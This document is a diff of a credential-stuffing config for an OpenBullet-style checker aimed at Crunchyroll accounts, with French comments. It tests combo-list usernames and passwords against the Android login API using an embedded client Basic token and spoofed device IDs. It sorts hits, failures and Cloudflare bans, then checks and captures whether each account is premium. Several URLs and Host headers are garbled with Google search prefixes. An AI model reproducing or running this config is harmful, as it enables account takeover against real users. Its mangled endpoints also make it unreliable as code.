@@ -1,6 +1,6 @@
 [SETTINGS]
 {
-"Name": "Crunchyroll Android API V3",
+"Name": "Crunchyroll Android V4",
 "SuggestedBots": 50,
 "MaxRecheckModes": 1,
 "Separator": ":",
@@ -15,50 +15,49 @@
 }
 }
 ​[SCRIPT]
-​--- GENERATION DES IDENTIFIANTS MOBILES ---
-​On simule un appareil unique pour chaque essai
-​FUNCTION Guid -> VAR "DEVICE_ID"
-FUNCTION ToUppercase "<DEVICE_ID>" -> VAR "UPPER_DEVICE_ID"
-​--- REQUETE DE CONNEXION (TOKEN) ---
-​Utilisation de l'API Beta Android (Moins de Cloudflare)
-​REQUEST POST "https://beta-api.crunchyroll.com/auth/v1/token"
-CONTENT "grant_type=password&scope=offline_access&username=<USER>&password=<PASS>&device_id=<DEVICE_ID>&device_name=SM-G991B&device_type=android"
+​--- INITIALISATION ---
+​Génération d'un Device ID unique
+​FUNCTION Guid -> VAR "DEVICE"
+FUNCTION ToUppercase "<DEVICE>" -> VAR "DEVICE_ID"
+​--- LOGIN REQUEST ---
+​On cible l'API auth/v1/token avec le Basic Token officiel
+​REQUEST POST "https://https://www.google.com/search?q=beta-api.crunchyroll.com/auth/v1/token"
+CONTENT "grant_type=password&scope=offline_access&username=<USER>&password=<PASS>&device_id=<DEVICE_ID>&device_name=SM-G998B&device_type=android"
 CONTENTTYPE "application/x-www-form-urlencoded"
+HEADER "Host: https://www.google.com/search?q=beta-api.crunchyroll.com"
+HEADER "Authorization: Basic dWtveTJxY2VzcmRvaHBlc3F1YnI6XzFLRDFxMGZDT1pYTlJMcFRUaU9KMTBBSkhkWFV1d2c="
 HEADER "User-Agent: Crunchyroll/3.79.0 Android/12 okhttp/4.12.0"
-​Token Basic officiel extrait de l'APK Crunchyroll
-​HEADER "Authorization: Basic dWtveTJxY2VzcmRvaHBlc3F1YnI6XzFLRDFxMGZDT1pYTlJMcFRUaU9KMTBBSkhkWFV1d2c="
 HEADER "Etp-Anonymous-Id: <DEVICE_ID>"
 HEADER "Accept-Encoding: gzip"
-​--- ANALYSE DU RESULTAT LOGIN ---
+​Vérification des identifiants (Code 200 = OK)
 ​KEYCHECK
 KEYCHAIN Success OR
 VALUE "access_token" EXISTS
 KEYCHAIN Failure OR
 VALUE "invalid_credentials" EXISTS
 VALUE "Unauthorized" EXISTS
+VALUE "401" EXISTS
 KEYCHAIN Ban OR
 VALUE "403 Forbidden" EXISTS
 VALUE "Cloudflare" EXISTS
-VALUE "Access Denied" EXISTS
 ​Extraction du token d'accès
-​PARSE "<SOURCE>" JSON "access_token" -> VAR "TOKEN"
-​--- VERIFICATION DU STATUT PREMIUM ---
-​On interroge l'API des souscriptions pour savoir si c'est un HIT ou un FREE
+​PARSE "<SOURCE>" JSON "access_token" -> VAR "ACC_TOKEN"
+​--- SUBSCRIPTION CHECK ---
+​Requête pour vérifier si le compte est Premium ou Gratuit
 ​REQUEST GET "https://www.google.com/search?q=https://beta-api.crunchyroll.com/subs/v1/subscriptions/me"
+HEADER "Host: https://www.google.com/search?q=beta-api.crunchyroll.com"
+HEADER "Authorization: Bearer <ACC_TOKEN>"
 HEADER "User-Agent: Crunchyroll/3.79.0 Android/12 okhttp/4.12.0"
-HEADER "Authorization: Bearer <TOKEN>"
-​--- TRI FINAL ---
+​--- TRI ET CAPTURE ---
 ​KEYCHECK
 KEYCHAIN Success OR
 VALUE "premium" EXISTS
 VALUE "subscription" EXISTS
 VALUE "plan_id" EXISTS
 KEYCHAIN Custom "FREE" OR
-VALUE "[]" EXISTS
 VALUE "total":0" EXISTS
+VALUE "[]" EXISTS
 VALUE "no_subscription" EXISTS
-​--- CAPTURE DES INFOS ---
-​Pour voir quel plan le compte possède dans tes logs
-​PARSE "<SOURCE>" JSON "total" -> CAP "Nb Abonnements"
-PARSE "<SOURCE>" JSON "external_id" -> CAP "Type de Plan"
+​Capture des détails du plan
+​PARSE "<SOURCE>" JSON "external_id" -> CAP "Plan"
 PARSE "<SOURCE>" JSON "status" -> CAP "Statut"
